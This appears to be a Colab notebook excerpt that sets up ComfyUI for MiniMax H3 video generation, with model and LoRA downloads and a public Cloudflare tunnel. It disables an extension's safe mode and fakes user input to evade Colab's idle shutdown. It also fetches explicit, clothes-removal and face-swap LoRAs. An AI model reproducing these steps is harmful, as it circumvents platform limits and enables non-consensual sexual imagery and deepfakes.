    if "this.safeMode = true;" in _pca_s:
        _pca_s = _pca_s.replace("this.safeMode = true;", "this.safeMode = false;")
        open(_pca_ext, "w", encoding="utf-8").write(_pca_s)

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

for _pw in range(3):
    try:
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}), timeout=120).read()
        break
    except Exception:
        time.sleep(2)

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

# === [AGY_FOREGROUND_GUARDIAN_V2] 保持 Colab 内核 Busy 防闲置断连 + ComfyUI/隧道崩溃 3秒自动复活 ===
print("🛡️ [防断连守护已启动] 当前单元格将保持运行状态以防止 Colab 闲置回收（如需切换其他模型格，点左上角 ⏹️ 停止即可）...")
_guardian_tick = 0
try:
    while True:
        time.sleep(15)
        _guardian_tick += 1
        # 1. 检查 ComfyUI 8188 端口，若因显存/内存峰值闪退则 3 秒内原地自动重启（网址不变）
        if not _is_port_open(8188):
            print("⚠️ 检测到 ComfyUI 引擎意外退出，正在 3 秒内自动重启恢复（原 Cloudflare 网址保持不变）...")
            subprocess.Popen(
                ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
                cwd="/content/ComfyUI",
                start_new_session=True
            )
            for _ in range(90):
                if _is_port_open(8188):
                    print("✅ ComfyUI 引擎已自动复活！切回网页即可继续使用。")
                    break
                time.sleep(0.5)
        # 2. 检查 cloudflared 进程是否存活
        if subprocess.run(["pgrep", "-x", "cloudflared"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            print("⚠️ 检测到 Cloudflare 隧道进程断开，正在自动重连...")
            cf_url = _ensure_cf_tunnel()
            print(f"✅ 隧道已重新连通：👉 {cf_url}")
        # 3. 每 45 秒通过 Colab 官方双向 RPC 通道发送一次轻量心跳，重置前端闲置计时器
        if _guardian_tick % 3 == 0:
            try:
                from google.colab import output as _colab_out
                _colab_out.eval_js("1", ignore_result=True)
            except Exception:
                pass
except KeyboardInterrupt:
    print("⏹️ 已手动停止守护循环（后台 ComfyUI 与隧道仍保持运行，可随时运行其他单元格）。")


In [ ]:
# @title ⚡ 4. FastH3-Omni 实时全参选项（UCSD×NVIDIA官方41G原生8步底模 + 13G Blackwell加速版）
# === [AGY_COLAB_KEEPALIVE_GUARD] ===
try:
    from IPython.display import display, Javascript
    display(Javascript('''
    (function(){
      try {
        if (!window._agyKeepAliveAudio) {
          const Ctx = window.AudioContext || window.webkitAudioContext;
          const ctx = new Ctx();
          const osc = ctx.createOscillator();
          const g = ctx.createGain();
          g.gain.value = 0.00001;
          osc.connect(g); g.connect(ctx.destination); osc.start();
          window._agyKeepAliveAudio = ctx;
        }
      } catch(e){}
      if (window._agyKeepAliveTimer) clearInterval(window._agyKeepAliveTimer);
      window._agyKeepAliveTimer = setInterval(() => {
        try {
          if (window._agyKeepAliveAudio && window._agyKeepAliveAudio.state === 'suspended') window._agyKeepAliveAudio.resume();
          const doc = window.parent ? window.parent.document : document;
          doc.dispatchEvent(new MouseEvent('mousemove', {bubbles:true, clientX:120, clientY:120}));
          doc.dispatchEvent(new KeyboardEvent('keydown', {bubbles:true, key:'Shift'}));
        } catch(e){}
      }, 45000);
    })();
    '''))
except Exception:
    pass
# @markdown > 💡 **UCSD × NVIDIA 官方 8 步极速全参底模**（自动同时挂载 41G BF16 与 13G NVFP4 双版本）：
重置默认工作流 = False # @param {type:"boolean"}
# --- Auto-Ensure Pika H3 Flex 6-Step Turbo LoRAs (Ref2VA & FL2VA) ---
def _ensure_pika_h3_flex_loras():
    import os, subprocess
    lora_dir = "/content/lora_pool_h3"
    os.makedirs(lora_dir, exist_ok=True)
    pika_loras = [
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_ref2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方多参版】pika_h3_flex_ref2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_fl2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方首尾帧版】pika_h3_flex_fl2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_ref2va_v1_avg_rank_55_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量多参版】pika_h3_flex_ref2va_kijai_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_fl2va_v1_avg_rank_56_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量首尾帧版】pika_h3_flex_fl2va_kijai_bf16.safetensors"),
    ("https://huggingface.co/Kijai/MiniMax-H3-experimental/resolve/main/loras/minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors", "【2K超清重绘精修LoRA-OpenRegen】minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_character_swap_v1.1_ref2va_fro.safetensors", "【视频换人角色替换LoRA-Alisson】minimax_h3_character_swap_v1.1_ref2va_fro.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_head_swap_v1.0_r32.safetensors", "【视频换头换脸LoRA-Alisson】minimax_h3_head_swap_v1.0_r32.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors", "【视频动作迁移跳舞LoRA-Alisson】minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors"),
    ]
    for url, fname in pika_loras:
        dst = os.path.join(lora_dir, fname)
        if not os.path.exists(dst) or os.path.getsize(dst) < 1024 * 1024:
            print(f"⚡ 正在自动下载 Pika H3 Flex 6步极速加速模型: {fname} ...")
            subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--console-log-level=error", "-d", lora_dir, "-o", fname, url], check=False)
_ensure_pika_h3_flex_loras()

import socket
import os, sys, time, subprocess, re, shutil, json, urllib.request
from IPython.display import display, HTML, clear_output
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)
for _h3_cn, _h3_url in [("ComfyUI-H3-LongVideo", "https://github.com/Zzz1phyrf/ComfyUI-H3-LongVideo.git"), ("selflift-Avatar", "https://github.com/slmonker/selflift-Avatar.git"), ("ComfyUI-YCNodes-MiniMax-H3", "https://github.com/yichengup/ComfyUI-YCNodes-MiniMax-H3.git"), ("rgthree-comfy", "https://github.com/rgthree/rgthree-comfy.git"), ("ComfyUI-MiniMaxH3-PrefixStream", "https://github.com/knoic/ComfyUI-MiniMaxH3-PrefixStream.git"), ("ComfyUI-FeiHou-Easy-H3", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Easy-H3.git"), ("ComfyUI-MiniMaxH3_LatentUpscaler", "https://github.com/TripleHeadedMonkey/ComfyUI-MiniMaxH3_LatentUpscaler.git"), ("BSAI-MiniMAX-H3-Prompt", "https://github.com/xm6018924/BSAI-MiniMAX-H3-Prompt.git")]:
    if not os.path.exists(f"/content/ComfyUI/custom_nodes/{_h3_cn}"):
        subprocess.run(["git", "clone", "--depth", "1", _h3_url, f"/content/ComfyUI/custom_nodes/{_h3_cn}"], check=False)
        if _h3_cn == "ComfyUI-H3-LongVideo": subprocess.run([sys.executable, "-m", "pip", "install", "-q", "faster-whisper==1.2.1"], check=False)

if not os.path.exists("/content/ComfyUI/main.py"):
    raise SystemExit("❌ 请先运行【🛠️ 1. 必备基础框架】！")

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
import shutil as _sh_a2
if not _sh_a2.which("aria2c"):
    subprocess.run("apt-get update -qq && apt-get install -y -qq aria2 >/dev/null 2>&1", shell=True, check=False)
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)

target_model_bf16 = "【41G满血8步原生-FastH3-Omni】fasth3_omniref_8step_pruned_bf16.safetensors"
target_url_bf16 = "https://huggingface.co/FastVideo/FastH3-Omni-Comfy/resolve/main/diffusion_models/fasth3_omniref_8step_pruned_bf16.safetensors"

target_model_fp4 = "【13G极速Blackwell专属-FastH3-Omni】fasth3_omniref_qad_nvfp4_comfy.safetensors"
target_url_fp4 = "https://huggingface.co/FastVideo/FastH3-Omni-NVFP4-QAD-Comfy/resolve/main/fasth3_omniref_qad_nvfp4_comfy.safetensors"

target_clip = "【25G轻量化-官方INT8】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
target_clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"

for f in list(os.listdir(diff_dir)):
    fp = os.path.join(diff_dir, f)
    if os.path.islink(fp):
        try: os.unlink(fp)
        except Exception: pass
    elif f.endswith(".safetensors") and f not in [target_model_bf16, target_model_fp4]:
        try:
            os.remove(fp)
            print(f"🗑️ 已卸载其他底模释放空间: {f}")
        except Exception:
            pass
for f in list(os.listdir(clip_dir)):
    fp = os.path.join(clip_dir, f)
    if os.path.islink(fp):
        try: os.unlink(fp)
        except Exception: pass
    elif f.endswith(".safetensors") and f not in [target_clip, target_clip_fp4]:
        try:
            os.remove(fp)
            print(f"🗑️ 已卸载非当前 CLIP: {f}")
        except Exception:
            pass

for m_name, m_url in [(target_model_bf16, target_url_bf16), (target_model_fp4, target_url_fp4)]:
    m_path = os.path.join(diff_dir, m_name)
    if not os.path.exists(m_path) or os.path.getsize(m_path) < 1024 * 1024 * 100:
        print(f"⏳ 正在高速下载 FastH3-Omni 模型: {m_name} ...")
        subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--allow-overwrite=true", "-d", diff_dir, "-o", m_name, m_url], check=False)
    print(f"✅ 模型已就绪: {m_name}")

target_clip_fp4 = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
target_clip_fp4_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
for _cn, _cu in [(target_clip, target_clip_url), (target_clip_fp4, target_clip_fp4_url)]:
    _cp = os.path.join(clip_dir, _cn)
    if not os.path.exists(_cp) or os.path.getsize(_cp) < 1024 * 1024 * 100:
        subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--allow-overwrite=true", "-d", clip_dir, "-o", _cn, _cu], check=False)

_lora_active = "/content/ComfyUI/models/loras"
os.makedirs("/content/lora_pool_h3", exist_ok=True)
# Auto-install all H3 LoRAs (including the 4 new Civitai LoRAs) whenever any H3 cell runs
import urllib.request as _ur_l
from concurrent.futures import ThreadPoolExecutor as _TPE_L
_h3_pool = "/content/lora_pool_h3"
os.makedirs(_h3_pool, exist_ok=True)
_civ_tok = globals().get("C站_API_Token", "")
_civ_h3_list = [["3413468", "3305979", "【H3-C站大人解锁V2.1】Minimax_H3_Unlocked_V2.1.safetensors"], ["3399711", "3290118", "【H3-C站大人-女性特写动作V1】H3_Female_Action_V1.safetensors"], ["3394502", "3284268", "【H3-C站大人-去衣动作V1.1】H3_Remove_Clothes_V1.1.safetensors"], ["3268303", "3152083", "【H3-C站大人-全能互动AIO_V2.5】H3_AIO_Interaction_V2.5.safetensors"], ["3206518", "3088013", "【H3-C站大人-全能互动AIO_V2】H3_AIO_Interaction_V2.safetensors"], ["3416478", "3311427", "【H3-C站大人-双人互动增强V5_全参】Mystic_MMH3_V5_Ref2VA.safetensors"], ["3403761", "3294817", "【C站成人-传教士姿势增强V1】MISSIONLG_H3_v1.safetensors"], ["3420786", "3314770", "【H3-C站大人-亲密互动特写V1】H3_Close_Interaction_V1.safetensors"], ["3404369", "3295540", "【H3-C站大人-身材细节增强V1】H3_Body_Detail_V1.safetensors"], ["3237012", "3119472", "【H3-C站大人-丰满曲线增强V0.3】H3_Curvy_Helper_V0.3.safetensors"], ["3402446", "3293205", "【H3-C站大人-俯视领口走光增强V1】Down_blouse_101-h3.safetensors"], ["3426349", "3321345", "【H3-C站大人-抓头发互动动作V1】hair_pulling_h3_101.safetensors"], ["3408385", "3300137", "【H3-C站大人-快慢动作极限滑块V2】PornMaster_MMH3_Fast_motion_slider_V2.safetensors"], ["3202732", "3091422", "【4步加速LoRA-Turbo社区版】minimax_h3_turbo_v4_step600_pruned_comfyui.safetensors"], ["3384273", "3273015", "【慢动作丝滑同步LoRA】SSS_Rank_MiniMax_H3_Smooth_Slow_Sync.safetensors"], ["3421124", "3315156", "【真人皮肤去油光LoRA】MMH3_RealismSlider_V1.safetensors"], ["3314964", "3200403", "【细节锐化增强LoRA】MMH3_DetailSlider_V1.safetensors"], ["3409409", "3301293", "【动作速度调节LoRA】MMH3_ActionSpeedSlider_V1.safetensors"], ["3389300", "3278497", "【C站增强-动作快慢速率滑块】H3_speed_slider_1.1.safetensors"]]
class _NoRedirL(_ur_l.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl): return None
_civ_op_l = _ur_l.build_opener(_NoRedirL)
def _res_civ_l(item):
    _vid, _fid, _fn = item
    _fp = os.path.join(_h3_pool, _fn)
    if os.path.exists(_fp) and os.path.getsize(_fp) > 50000: return None
    _u = f"https://civitai.com/api/download/models/{_vid}?fileId={_fid}&token={_civ_tok}"
    try: _civ_op_l.open(_ur_l.Request(_u, headers={"User-Agent": "Mozilla/5.0"}), timeout=12)
    except _ur_l.HTTPError as _e:
        if _e.headers.get("Location"): return (_e.headers.get("Location"), _fn)
    except Exception: pass
    return (_u, _fn)
_aria_l = []
with _TPE_L(max_workers=10) as _ex_l:
    for _r in _ex_l.map(_res_civ_l, _civ_h3_list):
        if _r: _aria_l.append(f"{_r[0]}\n  dir={_h3_pool}\n  out={_r[1]}")
if _aria_l:
    print(f"⏳ 正在自动并发补齐 {len(_aria_l)} 个 H3 专属 C站 LoRA...")
    open("/tmp/h3_civ_loras.txt", "w", encoding="utf-8").write("\n".join(_aria_l) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/h3_civ_loras.txt", "-c", "-j", "16", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn"], check=False)
for _del_d in ("/content/lora_pool_h3", "/content/ComfyUI/models/loras"):
    if os.path.isdir(_del_d):
        for _del_f in ['【C站成人-双人互动增强V1】MysticXXX_MMH3-V1.safetensors', '【H3-C站大人-双人互动增强V5_文生图生】Mystic_MMH3_V5_FL2VA.safetensors', '【H3-C站大人-高频动作律动增强V2_文生图生】H3_Motion_Booster_V2.safetensors', '【H3-C站大人-高频动作律动增强V2_全参】H3_Motion_Booster_V2_Ref2VA.safetensors', '【H3-C站大人-流体特效增强V1】H3_Fluid_Effect_V1.safetensors']:
            _del_p = os.path.join(_del_d, _del_f)
            if os.path.exists(_del_p) or os.path.islink(_del_p):
                try: os.remove(_del_p)
                except Exception: pass
for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass
os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
os.makedirs(_lora_active, exist_ok=True)
for _f in list(os.listdir(_lora_active)):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p):
        try: os.unlink(_p)
        except Exception: pass
    elif os.path.isfile(_p) and _f.endswith(".safetensors"):
        _is_qw = any(_k in _f for _k in ("千问", "Qwen", "qwen", "Anime2Real", "2anime", "canon_qwen", "chatrlabs", "multiple_angles", "viggle", "NoctQA"))
        _pool = "/content/lora_pool_qwen" if _is_qw else "/content/lora_pool_h3"
        try: os.replace(_p, os.path.join(_pool, _f))
        except Exception: pass
for _f in sorted(os.listdir("/content/lora_pool_h3")):
    _src_p = os.path.join("/content/lora_pool_h3", _f)
    if _f.endswith(".safetensors") and os.path.exists(_src_p) and os.path.getsize(_src_p) > 50 * 1024:
        _dst_p = os.path.join(_lora_active, _f)
        if not os.path.exists(_dst_p):
            try: os.symlink(_src_p, _dst_p)
            except Exception: pass

_wf_h3 = "/content/wf_pool_h3"
_wf_omni = "/content/wf_pool_omni"
_wf_active = "/content/ComfyUI/user/default/workflows"
os.makedirs(_wf_h3, exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
os.makedirs(_wf_omni, exist_ok=True)
os.makedirs(_wf_active, exist_ok=True)
for _wf in list(os.listdir(_wf_active)):
    if _wf.endswith(".json"):
        _wfp = os.path.join(_wf_active, _wf)
        if "qwen" in _wf.lower() or "千问" in _wf:
            try:
                shutil.copy2(_wfp, os.path.join("/content/wf_pool_qwen", _wf))
                os.remove(_wfp)
            except Exception: pass
        elif not globals().get("重置默认工作流", False) and os.path.getsize(_wfp) > 100:
            try: shutil.copy2(_wfp, os.path.join(_wf_h3, _wf))
            except Exception: pass

if os.path.exists(_wf_h3):
    for wfname in os.listdir(_wf_h3):
        if wfname.endswith(".json"):
            src_wf = os.path.join(_wf_h3, wfname)
            try:
                with open(src_wf, "r", encoding="utf-8") as f:
                    wf = json.load(f)
                for node in wf.get("nodes", []):
                    ntype = node.get("type", "")
                    if ntype == "UNETLoader" and node.get("widgets_values"):
                        node["widgets_values"][0] = target_model_bf16
                    elif ntype == "CLIPLoader" and node.get("widgets_values"):
                        node["widgets_values"][0] = target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and len(node.get("widgets_values", [])) >= 7:
                        node["widgets_values"][5] = target_model_bf16
                        node["widgets_values"][6] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and len(node.get("widgets_values", [])) >= 3:
                        node["widgets_values"][0], node["widgets_values"][1], node["widgets_values"][2] = target_model_bf16, target_model_bf16, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and len(node.get("widgets_values", [])) >= 2:
                        node["widgets_values"][0], node["widgets_values"][1] = target_model_bf16, target_clip
                    elif ntype in ("LoraLoaderModelOnly", "LoraLoader") and node.get("widgets_values"):
                        lname = str(node["widgets_values"][0])
                        if any(k in lname.lower() for k in ["8step", "turbo", "8步", "dareties"]):
                            node["mode"] = 4
                for _sg in wf.get("definitions", {}).get("subgraphs", []):
                    for _sn in _sg.get("nodes", []):
                        if _sn.get("type") == "UNETLoader" and _sn.get("widgets_values"):
                            _sn["widgets_values"][0] = target_model_bf16
                        elif _sn.get("type") == "CLIPLoader" and _sn.get("widgets_values"):
                            _sn["widgets_values"][0] = target_clip
                omni_wfname = wfname[5:] if wfname.startswith("Omni_") else wfname
                with open(os.path.join(_wf_omni, omni_wfname), "w", encoding="utf-8") as f:
                    json.dump(wf, f, ensure_ascii=False, indent=2)
            except Exception:
                pass

for _f in os.listdir(_wf_active):
    if _f.endswith(".json"):
        try: pass
        except Exception: pass
for _f in os.listdir(_wf_omni):
    if _f.endswith(".json"):
        shutil.copy2(os.path.join(_wf_omni, _f), os.path.join(_wf_active, _f))

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

